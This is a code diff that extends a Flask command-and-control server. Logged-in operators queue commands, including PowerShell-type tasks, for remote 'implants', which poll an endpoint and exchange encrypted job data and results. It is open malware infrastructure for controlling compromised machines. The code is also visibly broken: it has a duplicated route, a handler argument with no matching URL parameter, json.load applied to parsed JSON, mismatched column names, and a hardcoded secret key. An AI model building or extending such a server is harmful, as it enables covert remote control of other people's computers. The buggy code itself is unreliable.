@@ -1,9 +1,12 @@
 import flask
-from flask import Flask, Response, request, render_template, redirect, send_from_directory, url_for
+from flask import Flask, Response, request, render_template, redirect, send_from_directory, url_for, jsonify
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
 import flask_login
 import base64
+import os
+from .enc_json import encrypt, decrypt
+import json
 
 app = Flask(__name__)
 app.secret_key = '6AC6663F6BCFEB4191481AC41972DBEE4BDF6E7AA43E74F7E64C5F07DE69CE02'
@@ -32,9 +35,16 @@ class Operator(flask_login.UserMixin, db.Model):
 
 class Task(db.Model):
 	id=db.Column(db.Integer, primary_key=True)
+	job_id = db.Column(db.String)
 	cmd = db.Column(db.String, nullable=False)
-	status = db.Column(db.String, nullable=False, default="Pending")
+	#Command-Type i.e. is it a powershell cmd, etc.
+	command_type = db.Column(db.String)
+	Status = db.Column(db.String, nullable=False, default="Pending")
 	implant_id = db.Column(db.String, nullable=False)
+
+CREATED = "CREATED"
+TASKED = "TASKED"
+DONE = "DONE"
 
 ###################
 #  Login Manager  #
@@ -71,13 +81,92 @@ def login():
 	# Invalid login
 	return render_template('unauth.html')
 
-@app.route('/createtask/<ProductID>', methods=['POST'])
+#@app.route('/createtask/<ProductID>', methods=['POST'])
+@app.route("/tasks/create", methods=["POST"])
 @flask_login.login_required
 def createtask(ProductID):
 	new_task = Task(cmd=flask.request.form['command'], implant_id=ProductID)
 	db.session.add(new_task)
 	db.session.commit()
 	return redirect('/monitor')
+
+def find_agent_by_id(id_):
+    return Implant.query.filter_by(agent_id=id_).first()
+
+def make_job_id():
+    return os.urandom(16).hex()
+
+@app.route("/tasks/create", methods=["POST"])
+@flask_login.login_required
+def create_task():
+    data = request.json
+
+    if data == None:
+        return jsonify({"status": "bad task!"})
+    # Add error checking 
+    task_type = data.get("type")
+    task_command = data.get("cmd")
+    implant_id = data.get("implant_id")
+    agent = find_agent_by_id(implant_id)
+    if agent == None:
+        return jsonify({"status": "no agent with that ID"})
+    task = Task(
+        job_id= make_job_id() ,
+		cmd = task_command,
+        command_type = task_type,  
+        Status=CREATED,
+        agent_id= implant_id
+    )
+    db.session.add(task)
+    db.session.commit()
+
+    print(f"[+] A new task has been created for {implant_id}")
+    return jsonify({"status": "ok", "message": task.job_id})
+
+# we get get/recieve job reqeusts/response
+@app.route("/tasks", methods = [ "POST"])
+def tasking():
+    #add decrpyt for data
+	data = request.json #<== Get JSON Request
+	dict_data = json.load(data) #<== Convert JSON to Dict
+	dec_data = decrypt(dict_data) #Decrypt data
+	if dec_data == None:
+		return jsonify({"status": "Bad", "message": "boo you!"})
+	job_id = dec_data.get("job_id")
+	agent_id = dec_data.get("agent_id")
+	task_result = dec_data.get("task_response")
+	if task_result:
+		for response in task_result:
+			t_job_id = response.get("job_id")
+			t_job_resp = response.get("result")
+			task = Task.query.filter_by(job_id = t_job_id).first()
+			if task.Status != TASKED:
+				print("[+] Possible replay attack!", task)
+			else:
+				print(f"[+] Agent responded to job {t_job_id} with result: {t_job_resp}" )
+				task.Status = DONE
+				db.session.commit()
+            # we need to set the task to compiled 
+	agent = find_agent_by_id(agent_id)
+    # invalid agent 
+	if agent == None:
+		bad_agent = {"status": "Bad", "message": "Bad agent!"}
+		payload = encrypt(bad_agent)
+		return jsonify(payload)
+	task = Task.query.filter_by(agent_id=agent_id, Status = CREATED).first()
+	if task == None:
+        # no work to be done
+		return jsonify({})
+	else:
+        # have tasked the agent
+		task.Status = TASKED
+		db.session.commit()
+		payload = encrypt(dec_data) #<== Encrypt the dict
+		return jsonify(payload)
+
+	
+
+
 
 @app.route('/tasks/<ProductID>', methods=['GET'])
 def get_tasks(ProductID):
@@ -86,12 +175,8 @@ def get_tasks(ProductID):
 	implant.last_checkin = datetime.utcnow()
 	db.session.commit()
 	# Send pending commands to implant
-	tasks = Task.query.filter_by(implant_id=ProductID).all()
-	strTasks = []
-	for task in tasks:
-		strTasks.append(task.cmd)
-	res = ','.join(strTasks)
-	return flask.Response(response=res, status=200)
+	tasks = Task.query.filter_by(implant_id=ProductID).first()
+	return flask.Response(response=tasks.cmd, status=200)
 
 @app.route('/monitor')
 @flask_login.login_required
